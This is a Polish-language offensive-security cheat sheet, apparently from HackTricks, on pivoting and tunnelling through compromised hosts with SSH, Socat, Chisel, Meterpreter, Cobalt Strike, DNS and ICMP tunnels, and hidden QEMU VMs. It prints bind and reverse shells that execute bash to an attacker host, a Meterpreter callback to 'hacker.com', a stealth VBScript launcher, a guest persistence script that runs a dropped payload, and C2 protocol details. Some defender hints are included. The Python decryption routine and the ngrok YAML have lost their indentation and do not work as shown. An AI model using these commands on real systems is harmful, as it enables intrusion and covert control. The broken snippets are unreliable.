# Tunelowanie i przekierowywanie portów

{{#include ../banners/hacktricks-training.md}}

## Wskazówka dotycząca Nmap

> [!WARNING]
> **ICMP** i skany **SYN** nie mogą być tunelowane przez socks proxies, dlatego musimy **wyłączyć wykrywanie hostów** (`-Pn`) i określić **skany TCP** (`-sT`), aby to działało.

## **Bash**

**Host -> Jump -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

Graficzne połączenie SSH (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Local Port2Port

Otwórz nowy port na serwerze SSH --> Inny port
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Lokalny port --> Zcompromitowany host (SSH) --> Third_box:Port
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Lokalny port --> Zaatakowany host (SSH) --> Gdziekolwiek
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

Jest to przydatne do uzyskiwania reverse shells z hostów wewnętrznych przez DMZ do Twojego hosta:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Potrzebujesz **uprawnień root na obu urządzeniach** (ponieważ będziesz tworzyć nowe interfejsy), a konfiguracja sshd musi zezwalać na logowanie użytkownika root:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
Włącz przekazywanie po stronie Servera
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Ustaw nową trasę po stronie klienta
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Security – Terrapin Attack (CVE-2023-48795)**
> Atak downgrade Terrapin z 2023 roku może pozwolić osobie atakującej man-in-the-middle na manipulowanie początkowym handshake SSH i wstrzykiwanie danych do **dowolnego forwardowanego kanału** ( `-L`, `-R`, `-D` ). Upewnij się, że zarówno klient, jak i serwer mają zainstalowane poprawki (**OpenSSH ≥ 9.6/LibreSSH 6.7**) lub jawnie wyłącz podatne algorytmy `chacha20-poly1305@openssh.com` i `*-etm@openssh.com` w `sshd_config`/`ssh_config`, zanim zaczniesz polegać na SSH tunnels.

## SSHUTTLE

Możesz **tunelować** cały **traffic** przez **ssh** do **subnetwork** za pośrednictwem hosta.\
Na przykład forwardować cały traffic kierowany do 10.10.10.0/24
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Połącz się za pomocą klucza prywatnego
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

Lokalny port --> Skompromitowany host (aktywna sesja) --> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Inny sposób:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS proxy

Otwórz port na teamserverze nasłuchujący na wszystkich interfejsach, którego można użyć do **kierowania ruchu przez beacon**.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> W tym przypadku **port jest otwierany na hoście beacon**, a nie na Team Serverze, a ruch jest wysyłany do Team Servera, a stamtąd do wskazanego hosta:portu
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
Do zanotowania:

- Reverse port forward w Beacon jest przeznaczony do **tunelowania ruchu do Team Server, a nie do przekazywania go między poszczególnymi maszynami**.
- Ruch jest **tunelowany w ramach ruchu C2 Beacon**, w tym przez połączenia P2P.
- **Uprawnienia administratora nie są wymagane** do tworzenia reverse port forwardów na wysokich portach.

### rPort2Port local

> [!WARNING]
> W tym przypadku **port jest otwierany na hoście Beacon**, a nie na Team Server, natomiast **ruch jest wysyłany do klienta Cobalt Strike** (nie do Team Server), a następnie stamtąd do wskazanego hosta:portu
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Musisz przesłać webowy plik tunelujący: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Możesz pobrać go ze strony releases: [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Musisz używać **tej samej wersji po stronie client i server**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Przekierowanie portów
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

**Używaj tej samej wersji dla agenta i proxy**

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Bindowanie agenta i nasłuchiwanie
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### Dostęp do lokalnych portów agenta
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Reverse tunnel. Tunel jest uruchamiany z systemu ofiary.\
Proxy socks4 jest tworzony na 127.0.0.1:1080
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivot przez **NTLM proxy**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port przez socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter przez SSL Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Możesz ominąć **proxy bez uwierzytelniania**, wykonując tę linię zamiast ostatniej w konsoli ofiary:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### Tunel SSL Socat

**/bin/sh console**

Utwórz certyfikaty po obu stronach: klienta i serwera
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

Połącz lokalny port SSH (22) z portem 443 hosta atakującego
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

To konsolowa wersja PuTTY (opcje są bardzo podobne do klienta ssh).

Ponieważ ten plik binarny zostanie uruchomiony na komputerze ofiary i jest klientem ssh, musimy otworzyć naszą usługę ssh i port, aby uzyskać połączenie zwrotne. Następnie, aby przekierować port dostępny tylko lokalnie na port na naszym komputerze:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Musisz być lokalnym administratorem (dla dowolnego portu)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Musisz mieć **dostęp RDP do systemu**.\
Pobierz:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - To narzędzie wykorzystuje `Dynamic Virtual Channels` (`DVC`) z funkcji Remote Desktop Service systemu Windows. DVC odpowiada za **tunelowanie pakietów przez połączenie RDP**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

Na komputerze klienckim załaduj **`SocksOverRDP-Plugin.dll`** w następujący sposób:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Teraz możemy **połączyć się** z **ofiarą** przez **RDP** za pomocą **`mstsc.exe`**. Powinniśmy otrzymać **prompt** informujący, że **plugin SocksOverRDP** jest włączony i będzie **nasłuchiwać** na **127.0.0.1:1080**.

**Połącz się** przez **RDP**, a następnie prześlij i uruchom na maszynie ofiary plik binarny `SocksOverRDP-Server.exe`:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Teraz potwierdź na swojej maszynie (atakującej), że port 1080 nasłuchuje:
```
netstat -antb | findstr 1080
```
Teraz możesz użyć [**Proxifier**](https://www.proxifier.com/), aby przekierować ruch przez ten port.

## Proxify aplikacji GUI systemu Windows

Możesz sprawić, aby aplikacje GUI systemu Windows korzystały z proxy za pomocą [**Proxifier**](https://www.proxifier.com/).\
W sekcji **Profile -> Proxy Servers** dodaj adres IP i port serwera SOCKS.\
W sekcji **Profile -> Proxification Rules** dodaj nazwę programu, dla którego chcesz włączyć proxification, oraz połączenia z adresami IP, które chcesz objąć proxification.

## Obejście proxy NTLM

Wspomniane wcześniej narzędzie: **Rpivot**\
**OpenVPN** również może to obejść, jeśli w pliku konfiguracyjnym ustawisz następujące opcje:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Uwierzytelnia się względem proxy i wiąże lokalnie port, który jest przekierowywany do określonej usługi zewnętrznej. Następnie możesz użyć wybranego narzędzia za pośrednictwem tego portu.\
Na przykład przekierować port 443
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Teraz, jeśli na przykład ustawisz na ofierze usługę **SSH** tak, aby nasłuchiwała na porcie 443, możesz połączyć się z nią przez port 2222 atakującego.\
Możesz również użyć **meterpreter**, który łączy się z localhost:443, podczas gdy atakujący nasłuchuje na porcie 2222.

## YARP

Reverse proxy utworzony przez Microsoft. Możesz znaleźć go tutaj: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

W obu systemach wymagany jest root, aby utworzyć adaptery tun i przesyłać dane między nimi za pomocą zapytań DNS.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
Tunel będzie bardzo wolny. Możesz utworzyć skompresowane połączenie SSH przez ten tunel, używając:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Pobierz stąd**](https://github.com/iagox86/dnscat2)**.**

Ustanawia kanał C\&C przez DNS. Nie wymaga uprawnień root.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **W PowerShellu**

Możesz użyć [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell), aby uruchomić klienta dnscat2 w PowerShellu:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Przekierowanie portów za pomocą dnscat**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Zmiana DNS w proxychains

Proxychains przechwytuje wywołanie libc `gethostbyname` i tuneluje żądanie tcp DNS przez socks proxy. **Domyślnie** serwer **DNS** używany przez proxychains to **4.2.2.2** (zakodowany na stałe). Aby go zmienić, edytuj plik: _/usr/lib/proxychains3/proxyresolv_ i zmień adres IP. Jeśli jesteś w **Windows environment**, możesz ustawić adres IP **domain controller**.

## Tunnels in Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Custom DNS TXT / HTTP JSON C2 (AK47C2)

Aktor Storm-2603 utworzył **dual-channel C2 ("AK47C2")**, który wykorzystuje *wyłącznie* wychodzący ruch **DNS** i **plain HTTP POST** – dwa protokoły, które rzadko są blokowane w sieciach firmowych.<sup>[[2]](#references)</sup>

1. **DNS mode (AK47DNS)**
• Generuje losowy 5-znakowy SessionID (np. `H4T14`).
• Dodaje `1` dla *task requests* lub `2` dla *results*, a następnie łączy różne pola (flags, SessionID, computer name).
• Każde pole jest **XOR-encrypted kluczem ASCII `VHBD@H`**, kodowane w systemie szesnastkowym i łączone kropkami – na końcu dodawana jest domena kontrolowana przez attackera:

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• Żądania używają `DnsQuery()` dla rekordów **TXT** (oraz zapasowo **MG**).
• Gdy odpowiedź przekracza 0xFF bajtów, backdoor **fragmentuje** dane na części po 63 bajty i wstawia markery:
`s<SessionID>t<TOTAL>p<POS>`, aby serwer C2 mógł ponownie je uporządkować.

2. **HTTP mode (AK47HTTP)**
• Tworzy kopertę JSON:
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• Cały blob jest XOR-owany kluczem `VHBD@H` → kodowany w systemie szesnastkowym → wysyłany jako body żądania **`POST /`** z nagłówkiem `Content-Type: text/plain`.
• Odpowiedź używa tego samego kodowania, a pole `cmd` jest wykonywane za pomocą `cmd.exe /c <command> 2>&1`.

Uwagi dla Blue Team
• Szukaj nietypowych zapytań **TXT**, których pierwsza etykieta jest długim ciągiem szesnastkowym i które zawsze kończą się tą samą rzadką domeną.
• Stały klucz XOR, po którym następuje ASCII-hex, jest łatwy do wykrycia za pomocą YARA: `6?56484244?484` (`VHBD@H` w hex).
• W przypadku HTTP wykrywaj body żądań POST typu text/plain, które zawierają wyłącznie hex i mają liczbę bajtów będącą wielokrotnością dwóch.

{{#note}}
Cały kanał mieści się w **standard RFC-compliant queries** i utrzymuje każdą etykietę subdomeny poniżej 63 bajtów, dzięki czemu pozostaje stealthy w większości logów DNS.
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Root jest potrzebny w obu systemach do utworzenia adapterów tun i tunelowania danych między nimi za pomocą żądań ICMP echo.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Pobierz stąd**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) **to narzędzie umożliwiające wystawianie usług do Internetu za pomocą jednego polecenia.**\
_Adresy ekspozycji wyglądają następująco:_ **UID.ngrok.io**

### Instalacja

- Utwórz konto: https://ngrok.com/signup
- Pobierz klienta:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Podstawowe zastosowania

**Dokumentacja:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_Możliwe jest również dodanie uwierzytelniania i TLS, jeśli jest to konieczne._

#### Tunelowanie TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Udostępnianie plików przez HTTP
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Przechwytywanie wywołań HTTP

_Useful for XSS,SSRF,SSTI ..._\
Bezpośrednio ze stdout lub w interfejsie HTTP [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### Tunelowanie wewnętrznej usługi HTTP
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### Prosty przykład konfiguracji ngrok.yaml

Otwiera 3 tunele:

- 2 TCP
- 1 HTTP z udostępnianiem statycznych plików z /tmp/httpbin/
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Demon `cloudflared` firmy Cloudflare może tworzyć tunele wychodzące, które udostępniają **lokalne usługi TCP/UDP** bez konieczności stosowania reguł zapory dla ruchu przychodzącego, wykorzystując infrastrukturę edge Cloudflare jako punkt spotkania. Jest to bardzo przydatne, gdy zapora dla ruchu wychodzącego zezwala wyłącznie na ruch HTTPS, ale połączenia przychodzące są blokowane.

### Szybki tunel one-liner
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 pivot
```bash
# Turn the tunnel into a SOCKS5 proxy on port 1080
cloudflared tunnel --url socks5://localhost:1080 --socks5
# Now configure proxychains to use 127.0.0.1:1080
```
### Trwałe tunele z użyciem DNS
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
Tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
Uruchom connector:
```bash
cloudflared tunnel run mytunnel
```
Ponieważ cały ruch opuszcza hosta **wychodząc przez port 443**, tunele Cloudflared są prostym sposobem na ominięcie wejściowych ACL lub granic NAT. Pamiętaj, że binary zwykle działa z podwyższonymi uprawnieniami – gdy to możliwe, używaj kontenerów lub flagi `--user`.

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) to aktywnie rozwijany reverse proxy napisany w Go, obsługujący **TCP, UDP, HTTP/S, SOCKS oraz P2P NAT-hole-punching**. Od wersji **v0.53.0 (maj 2024)** może działać jako **SSH Tunnel Gateway**, dzięki czemu host docelowy może uruchomić reverse tunnel, korzystając wyłącznie ze standardowego klienta OpenSSH – bez konieczności używania dodatkowego binary.

### Klasyczny reverse TCP tunnel
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### Korzystanie z nowej bramy SSH (bez pliku binarnego frpc)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
Powyższa komenda publikuje port ofiary **8080** jako **attacker_ip:9000** bez wdrażania dodatkowych narzędzi – idealne rozwiązanie do pivotingu w stylu living-off-the-land.

## Ukryte tunele oparte na VM z QEMU

Sieciowanie w trybie użytkownika QEMU (`-netdev user`) obsługuje opcję o nazwie `hostfwd`, która **wiąże port TCP/UDP na *hoście* i przekazuje go do *gościa***. Gdy gość uruchamia pełny daemon SSH, reguła hostfwd zapewnia jednorazowy jump box SSH działający w całości wewnątrz efemerycznej VM – idealne rozwiązanie do ukrywania ruchu C2 przed EDR, ponieważ cała złośliwa aktywność i pliki pozostają na wirtualnym dysku.<sup>[[1]](#references)</sup>

### Szybka jednolinijkowa komenda
```powershell
# Windows victim (no admin rights, no driver install – portable binaries only)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• Powyższe polecenie uruchamia obraz **Tiny Core Linux** (`tc.qcow2`) w pamięci RAM.
• Port **2222/tcp** na hoście Windows jest przezroczysto przekierowywany do portu **22/tcp** wewnątrz gościa.
• Z punktu widzenia atakującego cel udostępnia po prostu port 2222; wszystkie pakiety, które do niego docierają, są obsługiwane przez serwer SSH działający w maszynie wirtualnej.

### Skryte uruchamianie za pomocą VBScript
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
Uruchomienie skryptu za pomocą `cscript.exe //B update.vbs` utrzymuje okno w ukryciu.

### Persistence inside guest

Ponieważ Tiny Core jest bezstanowy, atakujący zazwyczaj:

1. Zrzucają payload do `/opt/123.out`
2. Dopisują do `/opt/bootlocal.sh`:

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. Dodają `home/tc` oraz `opt` do `/opt/filetool.lst`, aby payload został spakowany do `mydata.tgz` podczas zamykania systemu.

### Dlaczego utrudnia to wykrycie

• Tylko dwa niepodpisane pliki wykonywalne (`qemu-system-*.exe`) zapisują dane na dysku; nie są instalowane żadne sterowniki ani usługi.
• Produkty bezpieczeństwa na hoście widzą **benign traffic przez loopback** (właściwy C2 kończy się wewnątrz VM).
• Skanery pamięci nigdy nie analizują przestrzeni procesowej malware, ponieważ znajduje się ona w innym systemie operacyjnym.

### Wskazówki dla defenderów

• Generuj alerty dotyczące **nieoczekiwanych plików binarnych QEMU/VirtualBox/KVM** w ścieżkach zapisywalnych przez użytkownika.
• Blokuj połączenia wychodzące inicjowane przez `qemu-system*.exe`.
• Wyszukuj rzadko używane porty nasłuchujące (2222, 10022, …), które zaczynają nasłuchiwać natychmiast po uruchomieniu QEMU.

## Węzły przekaźnikowe IIS/HTTP.sys za pośrednictwem `HttpAddUrl` (ShadowPad)

Moduł IIS ShadowPad grupy Ink Dragon przekształca każdy przejęty brzegowy serwer webowy w dwufunkcyjny **backdoor + relay**, wiążąc ukryte prefiksy URL bezpośrednio w warstwie HTTP.sys:<sup>[[3]](#references)</sup>

* **Domyślna konfiguracja** – jeśli konfiguracja JSON modułu pomija wartości, są one zastępowane wiarygodnymi wartościami domyślnymi IIS (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). Dzięki temu na benign traffic IIS odpowiada z właściwym brandingiem.
* **Przechwytywanie wildcardów** – operatorzy podają rozdzielaną średnikami listę prefiksów URL (wildcards w hoście i ścieżce). Moduł wywołuje `HttpAddUrl` dla każdego wpisu, dlatego HTTP.sys przekazuje pasujące żądania do malicious handlera *zanim* żądanie dotrze do modułów IIS.
* **Szyfrowany pierwszy pakiet** – pierwsze dwa bajty body żądania zawierają seed dla niestandardowego 32-bitowego PRNG. Każdy kolejny bajt jest poddawany operacji XOR z wygenerowanym keystreamem przed analizą protokołu:

```python
def decrypt_first_packet(buf):
seed = buf[0] | (buf[1] << 8)
num = seed & 0xFFFFFFFF
out = bytearray(buf)
for i in range(2, len(out)):
hi = (num >> 16) & 0xFFFF
num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
out[i] ^= num & 0xFF
return out
```

